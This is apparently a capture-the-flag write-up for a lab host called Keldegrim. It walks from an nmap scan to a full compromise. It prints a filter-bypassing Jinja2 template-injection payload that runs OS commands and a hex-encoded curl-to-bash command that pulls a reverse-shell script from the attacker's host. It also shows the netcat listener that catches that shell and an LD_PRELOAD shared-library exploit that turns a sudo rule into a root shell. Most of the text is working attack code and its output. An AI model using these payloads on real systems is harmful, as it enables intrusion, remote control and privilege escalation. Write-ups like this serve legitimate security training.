Keldegrim


NMAP RESULTS:

Nmap scan report for 10.10.169.47
Host is up, received echo-reply ttl 63 (0.16s latency).
Scanned at 2021-05-18 00:12:46 EDT for 18s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d8:23:24:3c:6e:3f:5b:b0:ec:42:e4:ce:71:2f:1e:52 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC1ElGI0HLd8mhCV1HC0Mdnml4FZPMr17SrcABm6GMKV0g5e4wQNtSPAvXhGj696aoKgVX1jDbe4DzDGr3jDkLjXegnpqQyVQnSYV7Cz9pON4b9cplT/OPK/7cd96E7tKFsZ3F+eOM51Vm6KeYUbZG0DnHZIB7kmPAH+ongqQmpG8Of/wXNgR4ONc6dD/lTYWCgWeCEYT0ERlErkqM05mO9DwV+7Lr+AZhAZ8afx+NSpV17gBZzjmqT4my3zMAf3Ne0VY/exvb807YKiHmPPaieE8KxjfRjcsHGsMuYesDm3m0cUvGSdp2xfu8J5dOSNJc5cVse6RBTPmPu4giRtm+v
|   256 c6:75:e5:10:b4:0a:51:83:3e:55:b4:f6:03:b5:0b:7a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBETP4uMiwXXjEW/UWp1IE/XvhxASBN753PiuZmLz6QiSZE3y5sIHpMtXA3Sss4bZh4DR3hoP3OhXgJmjCJaSS4=
|   256 4c:51:80:db:31:4c:6a:be:bf:9b:48:b5:d4:d6:ff:7c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJVgfo2NhVXDfelQtZw0p6JWJLPk2/1NF3KRImlYIIul
80/tcp open  http    syn-ack ttl 63 Werkzeug httpd 1.0.1 (Python 3.6.9)
| http-cookie-flags: 
|   /: 
|     session: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
|_http-title:  Home page 
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%), Linux 3.2 - 4.9 (92%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=5/18%OT=22%CT=%CU=30109%PV=Y%DS=2%DC=T%G=N%TM=60A33ED0%P=x86_64-pc-linux-gnu)
SEQ(SP=102%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)
OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)
WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)
ECN(R=Y%DF=Y%T=40%W=F507%O=M505NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 28.316 days (since Mon Apr 19 16:38:35 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   163.15 ms 10.8.0.1
2   163.25 ms 10.10.169.47

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 00:13
Completed NSE at 00:13, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 00:13
Completed NSE at 00:13, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 00:13
Completed NSE at 00:13, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.21 seconds
           Raw packets sent: 60 (4.236KB) | Rcvd: 51 (8.788KB)

---------------------
one thing i notice is that every wrong request gives 404 request (as usual), so i checked for SSTI vulnerability as this webpage is hosting on a "Werkzeug httpd 1.0.1 (Python 3.6.9)" which can be vulnerable (previous experience), so i use burpsuite and give request something like this:

-----------------
GET /admin{{7*7}} HTTP/1.1
Host: 10.10.169.47

GOT THE RESPONSE:
----------------
     <p class="lead">There has been an error when trying to view admin49! Please return back to the site</p>

WE CAN SEE "admin49" which means that aur basic arthematic operation got executed as there is no sanity check in the template input function

NOW LETS CHECK HOW TO EXPLOIT IT:
======================================

using this payload (which bypass all the filters) from PayloadAllTheThings:
PAYLOAD:
------------

{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}

RESPONSE:
--------------
     <p class="lead">There has been an error when trying to view adminuid=1000(jed) gid=1000(jed) groups=1000(jed)
! Please return back to the site</p>

WE HAVE CODE EXECUTION!!

FIRST CHECK THAT CURL IS PRESENT OR NOT(use %20 for space):
-------------------------------------------------------------

PAYLOAD:
---------
/admin{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('which%20curl')|attr('read')()}}

RESPONSE:
------------
     <p class="lead">There has been an error when trying to view admin/usr/bin/curl
! Please return back to the site</p>

YES, WE HAVE IT!

MAKE A BASH SCRIPT HAVING A REVERSE SHELL ONE-LINER AND THEN HOST A PYTHON SERVER, THEN USING A CURL COMMAND GET THAT FILE PIPE IT OVER TO BASH AND GET A REVERSE SHELL ON NETCAT LISTENER:
--------------------------------------------------

1.

# cat hello.sh 
#!/bin/bash
bash -i >& /dev/tcp/10.8.73.218/1234 0>&1

2.

# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

3. 

PAYLOAD:
-----------
/admin{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('\x63\x75\x72\x6c\x20\x68\x74\x74\x70\x3a\x2f\x2f\x31\x30\x2e\x38\x2e\x37\x33\x2e\x32\x31\x38\x2f\x68\x65\x6c\x6c\x6f\x2e\x73\x68\x20\x7c\x20\x62\x61\x73\x68')|attr('read')()}}

("curl 10.8.73.218/hello.sh | bash" is converted into hex to avoid bad characters)

OUR SERVER GOT HIT!:
-----------------------
 python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.169.47 - - [18/May/2021 01:44:05] "GET /hello.sh HTTP/1.1" 200 -
10.10.169.47 - - [18/May/2021 01:44:37] "GET /hello.sh HTTP/1.1" 200 -

GOT OUR REVERSE SHELL:
-----------------------

# nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.8.73.218] from (UNKNOWN) [10.10.169.47] 37816
bash: cannot set terminal process group (1021): Inappropriate ioctl for device
bash: no job control in this shell
jed@keldagrim:~$ 

GOT THE USER FLAG

AFTER READING THE SOURCE CODE, THIS PIECE CODE IS FILTERING OUR SSTI PAYLOAD(app.py):
---------------------------------------------------------------------------
def page_not_found(e):
    text = unquote(request.path.replace('/',''))
    for ch in ['/','[','_',']']:
        text = text.replace(ch,'')
    else:
        pass

I ALSO TRY TO CHANGE THE COOKIE TO "ADMIN" AS IT IS ONLY CONVERTING THE USERNAME IN BASE64 AND STORING IT AS A COOKIE, BUT DUE TO THIS LOGIC, I CAN'T GET ANYTHING(basic.py):
-------------------------------------------------------------------------------------------------------------------------

# Function that will check whether or not the user can access the admin button
def cookie_check():
    cookie = base64.b64decode(request.cookies.get('session')).decode("utf-8")
    if cookie == "admin":
        return ""
    else:
        return "disabled"
-----------------------------------

IT IS NOT RETURNING ANYTHING

THIS SNIPPET MAKE THE WEBSERVER VULNERABLE TO SSTI VULNERABILTY:
---------------------------------------------------------------------

def adminStuff():
    if 'sales' in request.cookies:
        cookie = request.cookies.get('sales')
        decoded = base64.b64decode(cookie).decode("utf-8")
        template = '''
        %s                                                        (DIRECTLY USING THE USER INPUT WITHOUT FILTERING IT)
        ''' % unquote(decoded)
        temp = render_template_string(template)
        return render_template('admin.html', temp = temp)
    else:
        sales = base64.b64encode(b'$2,165')
        resp = make_response(render_template('admin.html', temp = "$2,165"))
        resp.set_cookie('sales', sales)
        return resp
--------------------------------------


NOW CHECKING THE SUDOERS:
--------------------------

jed@keldagrim:~$ sudo -l
Matching Defaults entries for jed on keldagrim:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_PRELOAD

User jed may run the following commands on keldagrim:
    (ALL : ALL) NOPASSWD: /bin/ps
jed@keldagrim:~$


AS WE CAN SEE THAT THE "LD-PRELOAD" ENV VARIABLE IS SET, WE CAN EXPLOIT IT!!

THEORY:
--------------
LD_PRELOAD is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (libc.so) This is called preloading a library.


STEPS TO EXPLOIT:
-----------------------

1.Make a C file in which "LD_PRELOAD" env variable is set and the uid and gid to 0(root):

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}

2.Compile this C file using this command:

gcc -fPIC -shared -o pe.so pe.c -nostartfiles

3.Then execute this command:

sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo


IM ROOT NOW!!
--------------

jed@keldagrim:/tmp$ sudo LD_PRELOAD=./hello.so ps
root@keldagrim:/tmp#

GOT THE ROOT FLAG
